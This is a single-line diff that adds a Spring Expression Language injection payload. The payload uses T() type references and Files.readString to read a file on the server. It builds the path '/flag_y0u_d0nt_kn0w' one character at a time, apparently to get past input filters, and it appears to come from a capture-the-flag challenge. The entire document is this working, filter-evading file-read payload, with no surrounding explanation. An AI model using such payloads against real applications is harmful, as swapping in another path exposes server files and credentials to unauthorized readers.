@@ -1,0 +1,1 @@
+${T (java.nio.file.Files).readString(T (java.nio.file.Paths).get(T (java.lang.String).join('', T (java.util.Arrays).asList('/', 'f', 'l', 'a', 'g', '_', 'y', '0', 'u', '_', 'd', '0', 'n', 't', '_', 'k', 'n', '0', 'w'))))}
